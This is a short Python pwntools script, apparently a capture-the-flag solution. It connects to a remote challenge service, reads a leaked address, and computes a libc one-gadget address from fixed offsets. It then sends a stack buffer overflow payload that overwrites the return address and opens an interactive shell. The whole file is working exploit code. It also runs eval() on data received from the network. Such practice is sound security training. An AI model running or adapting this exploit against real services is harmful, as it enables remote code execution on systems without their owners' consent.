from pwn import *

p = remote('jh2i.com', 50005)

onegadget = eval('0x' + p.recvline().strip()[-18:-2]) - 0x000000000055800 + 0x45216

p.sendline('A'*(0x90+8) + p64(onegadget))
p.interactive()